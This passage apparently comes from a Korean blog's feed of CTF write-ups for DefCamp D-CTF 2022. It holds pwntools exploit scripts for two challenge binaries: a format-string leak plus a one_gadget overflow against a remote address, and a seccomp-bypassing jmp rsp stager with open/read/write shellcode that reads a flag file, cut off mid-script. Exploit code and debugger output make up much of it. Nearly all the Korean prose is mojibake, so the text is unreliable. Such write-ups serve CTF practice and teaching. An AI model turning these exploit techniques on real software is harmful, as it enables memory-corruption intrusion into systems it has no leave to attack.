class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment">#p = process(&#x27;./alarm&#x27;)</span></span><br><span class="line">p = remote(<span class="string">&#x27;34.159.80.143&#x27;</span>, <span class="number">31776</span></span><br><span class="line">e = ELF(<span class="string">&#x27;./alarm&#x27;</span>)</span><br><span class="line"><span class="comment">#libc = ELF(&#x27;/usr/lib/x86_64-linux-gnu/libc-2.31.so&#x27;)</span></span><br><span class="line">libc = ELF(<span class="string">&#x27;./libc-2.27.so&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">&#x27;system!&#x27;</span>, <span class="string">&#x27;%11$p %9$p&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p.recvline()</span><br><span class="line"></span><br><span class="line">leak = p.recvline().split(<span class="string">&#x27; &#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(leak)</span><br><span class="line"></span><br><span class="line">libc_leak = leak[<span class="number">0</span>]</span><br><span class="line">random_leak = leak[<span class="number">1</span>][:-<span class="number">1</span>] </span><br><span class="line"></span><br><span class="line">log.info(<span class="string">&#x27;libc_leak :: &#x27;</span> + libc_leak)</span><br><span class="line">log.info(<span class="string">&#x27;random_leak :: &#x27;</span> + random_leak)</span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">&#x27;alarm:&#x27;</span>, random_leak)</span><br><span class="line"></span><br><span class="line">libc_base = <span class="built_in">int</span>(libc_leak,<span class="number">16</span>) - <span class="number">231</span> - libc.symbols[<span class="string">&#x27;__libc_start_main&#x27;</span>]</span><br><span class="line">log.info(<span class="string">&#x27;libc_base :: &#x27;</span> + <span class="built_in">hex</span>(libc_base))</span><br><span class="line"></span><br><span class="line">ret = <span class="number">0x40067e</span></span><br><span class="line">oneshot = libc_base+<span class="number">0x4f302</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">&#x27;&#x27;</span></span><br><span class="line">payload += <span class="string">&#x27;A&#x27;</span> * <span class="number">112</span> </span><br><span class="line">payload += <span class="string">&#x27;B&#x27;</span> * <span class="number">8</span></span><br><span class="line"><span class="comment">#payload += p64(pop_rdi)</span></span><br><span class="line">payload += p64(ret)</span><br><span class="line">payload += p64(oneshot)</span><br><span class="line"></span><br><span class="line">p.send(payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h2 id="tmi"><a href="#tmi" class="headerlink" title="tmi"></a>tmi</h2><p>ì‚¬ì‹¤ ì´ ëŒ€íšŒ ê¸°ê°„ ë•Œ libc version êµ¬í•˜ê³  mainìœ¼ë¡œ ëŒë ¤ì„œ(?) ë­ ì´ê²ƒì €ê²ƒ ì‚½ì§ˆí•˜ë‹¤ê°€ ëª»í’€ì—ˆë‹¤ ã…‹ã…‹;; mainìœ¼ë¡œ ëŒë¦¬ë‹ˆê¹ ripê°€ ë§¨ ì²˜ìŒ ë³´ë‚´ì¤€ ëžœë¤ ê°’ìœ¼ë¡œ ë°”ë€Œì–´ì„œ ë‹¤ë¥¸ ì¼ì„ ìž ê¹ í•˜ëŸ¬ ê°”ë‹¤. ê·¸ëŸ° ì‚¬ì´ ëŒ€íšŒê°€ ì¢…ë£Œë˜ì–´ì„œ ì„œë²„ê°€ ë°”ë¡œ ë‹«í˜€ë²„ë ¤ì„œ remote shellì€ ë”°ì§€ ëª»í•˜ì˜€ë‹¤. í›„..</p><p>ì°½ë„ ë‹¤ ë‹«ì•„ë²„ë ¤ì„œ libc ë²„ì „ë„ ê¹Œë¨¹ì—ˆê³ , ì„œë²„ë„ ë‹«í˜€ì„œ offsetë„ êµ¬í•  ìˆ˜ ì—†ì–´ì„œ ë””ì½”ì— ì¡°ì‹¬ìŠ¤ëŸ½ê²Œ libc ë²„ì „ì„ ë¬¼ì–´ë´¤ë”ë‹ˆ <code>libc6_2.27-3ubuntu1.6_amd64.so</code> ë¼ê³  ì¹œì ˆí•˜ê²Œ ì•Œë ¤ì£¼ì…¨ë‹¤. ê·¸ëž˜ì„œ ë°”ì´ë„ˆë¦¬ë¥¼ patchí•˜ê³  í’€ì–´ë³´ì•˜ë‹¤. </p><p>ì‚¬ì‹¤ ì´ ê³¼ì •ì—ì„œ ìƒˆë¡œìš´ ì‚¬ì‹¤ì„ ì•Œê²Œ ë˜ì—ˆë‹¤.</p><p>ì•Œë ¤ì£¼ì‹  libc ë²„ì „ì€ Ubuntu 18.04ê³¼ ë™ì¼í•˜ë‹¤. ê·¸ëž˜ì„œ Ubuntu 18.04ì—ì„œ libcì™€ ldë¥¼ ê°€ì ¸ì™”ë‹¤.</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">jir4vvit@ubuntu:~/ctf/dctf/alarm$ ldd alarm</span><br><span class="line">linux-vdso.so.1 (0x00007fff621e2000)</span><br><span class="line">libc.so.6 =&gt; /lib/x86_64-linux-gnu/libc.so.6 (0x00007f05fa6c9000)</span><br><span class="line">/lib64/ld-linux-x86-64.so.2 (0x00007f05fa8cf000)</span><br><span class="line"></span><br><span class="line">jir4vvit@ubuntu:~/ctf/dctf/alarm$ ls</span><br><span class="line">alarm  ld-2.27.so  libc-2.27.so  local.py  remote.py</span><br></pre></td></tr></table></figure><p>patchë¥¼ í•˜ë ¤ëŠ”ë° ìž˜ ì•ˆë˜ì–´ì„œ ì•Œì•„ë³´ë‹ˆê¹Œ libc ì´ë¦„ì„ <code>libc.so.6</code>ìœ¼ë¡œ ë³€ê²½í•´ì•¼í•˜ë”ë¼.</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">jir4vvit@ubuntu:~/ctf/dctf/alarm$ patchelf --set-rpath . --set-interpreter ./ld-2.27.so alarm</span><br><span class="line">jir4vvit@ubuntu:~/ctf/dctf/alarm$ cp libc-2.27.so libc.so.6</span><br><span class="line">jir4vvit@ubuntu:~/ctf/dctf/alarm$ patchelf --set-rpath . --replace-needed libc.so.6 ./libc.so.6 alarm</span><br><span class="line">jir4vvit@ubuntu:~/ctf/dctf/alarm$ ldd alarm</span><br><span class="line">linux-vdso.so.1 (0x00007ffd5c699000)</span><br><span class="line">./libc.so.6 (0x00007f32d2251000)</span><br><span class="line">./ld-2.27.so =&gt; /lib64/ld-linux-x86-64.so.2 (0x00007f32d2644000)</span><br></pre></td></tr></table></figure><p>ì´ë ‡ê²Œ remoteì˜ ë°”ì´ë„ˆë¦¬ë¡œ patchí•´ì„œ remoteë¥¼ ìž˜ í•´ê²°í•  ìˆ˜ ìžˆì—ˆë‹¤.</p>]]></content>
      
      
      <categories>
          
          <category> WriteUp </category>
          
          <category> D-CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> fsb </tag>
            
            <tag> one_gadget </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>DefCamp Capture the Flag (D-CTF) 2022 - destruction (seccomp, shellcode)</title>
      <link href="/221005-d-ctf2022-destruction/"/>
      <url>/221005-d-ctf2022-destruction/</url>
      
        <content type="html"><![CDATA[<p>ë¶„ì„ í™˜ê²½: Windows 11, Ubuntu 20.04<br>ì‚¬ìš©ìž ì œê³µ íŒŒì¼: ë°”ì´ë„ˆë¦¬</p><p>í•´ë‹¹ ctfì— pwnì´ ë‘ ë¬¸ì œ ë‚˜ì™”ë‹¤. ì´ê±´ hardì´ë‹¤.</p><h2 id="Analysis"><a href="#Analysis" class="headerlink" title="Analysis"></a>Analysis</h2><h3 id="ë³´í˜¸-ê¸°ë²•"><a href="#ë³´í˜¸-ê¸°ë²•" class="headerlink" title="ë³´í˜¸ ê¸°ë²•"></a>ë³´í˜¸ ê¸°ë²•</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">Arch:     amd64-64-little</span><br><span class="line">RELRO:    Partial RELRO</span><br><span class="line">Stack:    No canary found</span><br><span class="line">NX:       NX disabled</span><br><span class="line">PIE:      No PIE (0x400000)</span><br><span class="line">RWX:      Has RWX segments</span><br></pre></td></tr></table></figure><p>ì•„ë¬´ê²ƒë„ ì•ˆê±¸ë ¤ìžˆë‹¤. ìŠ¤íƒì—ì„œ ì‰˜ì½”ë“œë„ ì‹¤í–‰ì´ ê°€ëŠ¥í•˜ë‹¤. í•˜ì§€ë§Œ <code>seccomp</code>ì´ ê±¸ë ¤ìžˆì§€.. ì‰˜ì½”ë“œ ì‹¤í–‰ì´ ì„ íƒì ìœ¼ë¡œ ê°€ëŠ¥í•˜ë‹¤.</p><h3 id="ì·¨ì•½ì "><a href="#ì·¨ì•½ì " class="headerlink" title="ì·¨ì•½ì "></a>ì·¨ì•½ì </h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">__int64 __fastcall <span class="title function_">main</span><span class="params">(<span class="type">int</span> a1, <span class="type">char</span> **a2, <span class="type">char</span> **a3)</span></span><br><span class="line">&#123;</span><br><span class="line">  __int64 buf[<span class="number">3</span>]; <span class="comment">// [rsp+0h] [rbp-20h] BYREF</span></span><br><span class="line">  <span class="type">int</span> v5; <span class="comment">// [rsp+1Ch] [rbp-4h]</span></span><br><span class="line"></span><br><span class="line">  buf[<span class="number">0</span>] = <span class="number">0LL</span>;</span><br><span class="line">  buf[<span class="number">1</span>] = <span class="number">0LL</span>;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Acces denied intruder detected!!&quot;</span>);</span><br><span class="line">  v5 = <span class="number">1</span>;</span><br><span class="line">  seccomp();</span><br><span class="line">  <span class="keyword">if</span> ( read(<span class="number">0</span>, buf, <span class="number">0x38</span>uLL) &lt;= <span class="number">0</span> )             <span class="comment">// bof</span></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">  <span class="keyword">if</span> ( <span class="built_in">strncmp</span>(<span class="string">&quot;done&quot;</span>, (<span class="type">const</span> <span class="type">char</span> *)buf, <span class="number">4uLL</span>) )</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ì·¨ì•½ì ì€ ê°„ë‹¨í•˜ë‹¤. ë°”ë¡œ bofê°€ ë°œìƒí•˜ëŠ” ê²ƒì„ í•œ ëˆˆì— ì°¾ì•„ë³¼ ìˆ˜ ìžˆë‹¤.</p><p>ê·¸ë¦¬ê³  ì´ ë°”ì´ë„ˆë¦¬ì—ì„œ ì¤‘ìš”í•œ ì ì€ seccomp í•¨ìˆ˜ê°€ ì •ì˜ë˜ì–´ ìžˆë‹¤ëŠ” ì‚¬ì‹¤ì´ë‹¤. </p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> ( prctl(<span class="number">38</span>, <span class="number">1LL</span>, <span class="number">0LL</span>, <span class="number">0LL</span>, <span class="number">0LL</span>) )</span><br><span class="line">&#123;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;prctl(NO_NEW_PRIVS)&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">if</span> ( !prctl(<span class="number">22</span>, <span class="number">2LL</span>, &amp;v1) )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;prctl(SECCOMP)&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Test&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> ( *__errno_location() == <span class="number">22</span> )</span><br><span class="line">&#123;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;SECCOMP_FILTER is not available. :(&quot;</span>);</span><br><span class="line">  <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> ( !*__errno_location() )</span><br><span class="line">  __asm &#123; jmp     rsp &#125;</span><br></pre></td></tr></table></figure><p><code>seccomp-tools</code>ì„ ì´ìš©í•˜ì—¬ íŽ¸ë¦¬í•˜ê²Œ í™•ì¸í•´ë³´ìž.</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">jir4vvit@ubuntu:~/ctf/dctf/destruction$ seccomp-tools dump ./destruction </span><br><span class="line">Acces denied intruder detected!!</span><br><span class="line"> line  CODE  JT   JF      K</span><br><span class="line">=================================</span><br><span class="line"> 0000: 0x20 0x00 0x00 0x00000004  A = arch</span><br><span class="line"> 0001: 0x15 0x01 0x00 0xc000003e  if (A == ARCH_X86_64) goto 0003</span><br><span class="line"> 0002: 0x06 0x00 0x00 0x00000000  return KILL</span><br><span class="line"> 0003: 0x20 0x00 0x00 0x00000000  A = sys_number</span><br><span class="line"> 0004: 0x15 0x00 0x01 0x00000002  if (A != open) goto 0006</span><br><span class="line"> 0005: 0x06 0x00 0x00 0x7fff0000  return ALLOW</span><br><span class="line"> 0006: 0x15 0x00 0x01 0x00000000  if (A != read) goto 0008</span><br><span class="line"> 0007: 0x06 0x00 0x00 0x7fff0000  return ALLOW</span><br><span class="line"> 0008: 0x15 0x00 0x01 0x0000003c  if (A != exit) goto 0010</span><br><span class="line"> 0009: 0x06 0x00 0x00 0x7fff0000  return ALLOW</span><br><span class="line"> 0010: 0x15 0x00 0x01 0x00000001  if (A != write) goto 0012</span><br><span class="line"> 0011: 0x06 0x00 0x00 0x7fff0000  return ALLOW</span><br><span class="line"> 0012: 0x06 0x00 0x00 0x00000000  return KILL</span><br></pre></td></tr></table></figure><p><code>open</code>, <code>read</code>, <code>exit</code>, <code>write</code> syscallì„ ì‚¬ìš©í•  ìˆ˜ ìžˆë‹¤.<br>ì¦‰,.. ì‰˜ì„ ë”°ëŠ” ë¬¸ì œê°€ ì•„ë‹ˆë¼ flagë¥¼ ORW í•´ì•¼í•˜ëŠ” ë¬¸ì œì´ë‹¤. </p><p>ìž…ë ¥í•  ìˆ˜ ìžˆëŠ” ë°”ì´íŠ¸ê°€ 0x38ì¸ë° ë°˜í•´ <code>buf</code> í¬ê¸°ê°€ 0x20ì´ë‹¤. </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line">â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€[ REGISTERS ]â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€</span><br><span class="line">*RAX  0x0</span><br><span class="line"> RBX  0x400910 â—‚â€” push   r15</span><br><span class="line">*RCX  0xfff0</span><br><span class="line">*RDX  0x4</span><br><span class="line">*RDI  0x400a09 â—‚â€” outsd  dx, dword ptr fs:[rsi] /* &#x27;done&#x27; */</span><br><span class="line"> RSI  0x7ffeb916ffe0 â—‚â€” 0x41414100656e6f64 /* &#x27;done&#x27; */</span><br><span class="line"> R8   0x0</span><br><span class="line"> R9   0x7c</span><br><span class="line"> R10  0xfffffffffffff40f</span><br><span class="line">*R11  0x4</span><br><span class="line"> R12  0x4005c0 â—‚â€” xor    ebp, ebp</span><br><span class="line"> R13  0x7ffeb91700f0 â—‚â€” 0x1</span><br><span class="line"> R14  0x0</span><br><span class="line"> R15  0x0</span><br><span class="line">*RBP  0x4141414141414141 (&#x27;AAAAAAAA&#x27;)</span><br><span class="line">*RSP  0x7ffeb9170008 â—‚â€” 0x4242424242424242 (&#x27;BBBBBBBB&#x27;)</span><br><span class="line">*RIP  0x40090a â—‚â€” ret    </span><br><span class="line">â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€[ DISASM ]â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€</span><br><span class="line">   0x4008ef    test   eax, eax</span><br><span class="line">   0x4008f1    jne    0x4008fa                      &lt;0x4008fa&gt;</span><br><span class="line"> </span><br><span class="line">   0x4008f3    mov    eax, 0</span><br><span class="line">   0x4008f8    jmp    0x400909                      &lt;0x400909&gt;</span><br><span class="line">    â†“</span><br><span class="line">   0x400909    leave  </span><br><span class="line"> â–º 0x40090a    ret    &lt;0x4242424242424242&gt;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€[ STACK ]â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€</span><br><span class="line">00:0000â”‚ rsp 0x7ffeb9170008 â—‚â€” 0x4242424242424242 (&#x27;BBBBBBBB&#x27;)</span><br><span class="line">01:0008â”‚     0x7ffeb9170010 â—‚â€” 0x4343434343434343 (&#x27;CCCCCCCC&#x27;)</span><br><span class="line">02:0010â”‚     0x7ffeb9170018 â€”â–¸ 0x7ffeb91700f8 â€”â–¸ 0x7ffeb9170565 â—‚â€” &#x27;./destruction&#x27;</span><br><span class="line">03:0018â”‚     0x7ffeb9170020 â—‚â€” 0x190f647a0</span><br><span class="line">04:0020â”‚     0x7ffeb9170028 â€”â–¸ 0x400886 â—‚â€” push   rbp</span><br><span class="line">05:0028â”‚     0x7ffeb9170030 â€”â–¸ 0x400910 â—‚â€” push   r15</span><br><span class="line">06:0030â”‚     0x7ffeb9170038 â—‚â€” 0x29e4545047266017</span><br><span class="line">07:0038â”‚     0x7ffeb9170040 â€”â–¸ 0x4005c0 â—‚â€” xor    ebp, ebp</span><br></pre></td></tr></table></figure><p>ë‹¹ì—°í•˜ê²Œë„ ret ìžë¦¬ì— ë°”ë¡œ ì‰˜ì½”ë“œë¥¼ ë„£ìœ¼ë©´ ì•ˆëœë‹¤. <code>jmp rsp</code>ë¼ëŠ” ì¢‹ì€ ê°€ì ¯ì´ ì¡´ìž¬í•´ì„œ ê·¸ê²ƒì„ ì‚¬ìš©í•´ì•¼ í•œë‹¤. ê·¸ëŸ¬ë©´ <code>rsp</code>ë¡œ jump í•˜ì—¬ ê·¸ ì£¼ì†Œì— ì €ìž¥ëœ ì½”ë“œë¥¼ ì‹¤í–‰í•˜ë ¤ê³  í•  ê²ƒì´ë‹¤. ë§Œì•½ <code>0x4242424242424242</code> ëŒ€ì‹  <code>jmp rsp</code> ê°€ì ¯ ì£¼ì†Œë¥¼ ë„£ëŠ”ë‹¤ë©´? </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">0x7ffeb9170008: 0x4141414141414141 0x0000000000400882 // jmp    rsp</span><br><span class="line">0x7ffeb9170010: 0x4343434343434343 ...</span><br></pre></td></tr></table></figure><p><code>0x4343434343434343</code> ê°€ ì‹¤í–‰ë  ê²ƒì´ë‹¤.</p><p>ì•„ë¬´íŠ¼ ì´ê±°ì— ìœ ì˜í•´ì„œ <code>ret</code>ì— <code>jmp rsp</code> ì£¼ì†Œë¥¼ ë„£ì–´ì£¼ë©´ ëœë‹¤. ê·¸ëŸ¬ë©´ ìš°ë¦¬ê°€ ì ì„ ìˆ˜ ìžˆëŠ” ë°”ì´íŠ¸ ìˆ˜ëŠ” ì˜¤ì§ 8ë°”ì´íŠ¸ë§Œì´ ë‚¨ëŠ”ë‹¤. </p><p>í”í•œ íŠ¸ë¦­ì€ í° ë°”ì´íŠ¸ë¥¼ ìž…ë ¥í•  ìˆ˜ ìžˆëŠ” <code>read</code> syscallì„ í˜¸ì¶œí•˜ëŠ” ê²ƒì´ë‹¤. ì´ê±¸ 8ë°”ì´íŠ¸ë¡œ êµ¬ì„±í•˜ë©´ ëœë‹¤. <code>read</code> syscallì„ êµ¬ì„±í•˜ëŠ” ë°ì—ëŠ” 3ê°œì˜ ì¸ìˆ˜ê°€ í•„ìš”í•˜ë‹¤. ì•„ë‹ˆ syscallì¸ê¹Œ 4ê°œê°€ í•„ìš”í•˜ë‹¤.</p><p><code>rax</code>, <code>rdi</code>, <code>rsi</code>, <code>rdx</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">RAX  0x0</span><br><span class="line">RDI  0x400a09 â—‚â€” outsd  dx, dword ptr fs:[rsi] /* &#x27;done&#x27; */</span><br><span class="line">RSI  0x7ffd095c5020 â—‚â€” 0x41414100656e6f64 /* &#x27;done&#x27; */</span><br><span class="line">RDX  0x4</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">asm(&#x27;&#x27;&#x27;</span><br><span class="line">    xor rdi, rdi</span><br><span class="line">    mov dh, 0x2</span><br><span class="line">    syscall</span><br><span class="line">    &#x27;&#x27;&#x27;)</span><br></pre></td></tr></table></figure><p><code>dh</code>ì— 0x2ë¥¼ ëŒ€ìž…í•˜ë©´ <code>rdx</code>ëŠ” ê²°êµ­ 0x00000204ê°€ ëœë‹¤. </p><p>flag ìœ„ì¹˜ëŠ” ë¬¸ì œì—ì„œ ì•Œë ¤ì¤¬ìœ¼ë‹ˆ, ê·¸ ì´í›„ì—” seccompì— ëª…ì‹œëœ syscallë“¤ì„ ì‚¬ìš©í•˜ë©´ì„œ íŽ¸í•˜ê²Œ ORW í•˜ë©´ ëœë‹¤.</p><h2 id="Exploit"><a href="#Exploit" class="headerlink" title="Exploit"></a>Exploit</h2><h3 id="Exploit-Code"><a href="#Exploit-Code" class="headerlink" title="Exploit Code"></a>Exploit Code</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.arch=<span class="string">&#x27;amd64&#x27;</span></span><br><span class="line">context.log_level=<span class="string">&#x27;DEBUG&#x27;</span></span><br><span class="line"></span><br><span class="line">p = process(<span class="string">&#x27;./destruction&#x27;</span>)</span><br><span class="line">e = ELF(<span class="string">&#x27;./destruction&#x27;</span>)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">&#x27;&#x27;</span></span><br><span class="line">payload += <span class="string">&#x27;done\x00&#x27;</span></span><br><span class="line">payload += <span class="string">&#x27;A&#x27;</span> * (<span class="number">0x28</span>-<span class="built_in">len</span>(payload))</span><br><span class="line"><span class="comment">#payload += &#x27;B&#x27; * 0x8 # ret</span></span><br><span class="line">payload += p64(<span class="number">0x400882</span>) <span class="comment"># jmp rsp</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">len</span>(payload))</span><br><span class="line">payload += asm(<span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">        xor rdi, rdi</span></span><br><span class="line"><span class="string">        mov dh, 0x2</span></span><br><span class="line"><span class="string">        syscall</span></span><br><span class="line"><span class="string">        &#x27;&#x27;&#x27;</span>)</span><br><span class="line">sleep(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">p.send(payload)</span><br><span class="line"></span><br><span class="line">shellcode = <span class="string">&#x27;&#x27;</span></span><br><span class="line">shellcode += <span class="string">&#x27;\x90&#x27;</span>*<span class="number">100</span></span><br><span class="line">shellcode += asm(<span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">        xor rdx, rdx</span></span><br><span class="line"><span class="string">        xor rsi, rsi</span></span><br><span class="line"><span class="string">        push rsi</span></span><br><span class="line"><span class="string">        mov rax, 0x7478742e67616c66</span></span><br><span class="line"><span class="string">        push rax</span></span><br><span class="line"><span class="string">        mov rdi, rsp</span></span><br><span class="line"><span class="string">        mov rax, 0x2</span></span><br><span class="line"><span class="string">        syscall</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">        mov rdi, rax</span></span><br><span class="line"><span class="string">        xor rax, rax</span></span><br><span class="line"><span class="string">        mov rdx, 0x60</span></span><br><span class="line"><span class="string">        mov rsi, rsp</span></span><br><span class="line"><span class="string">        syscall</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">        mov rax, 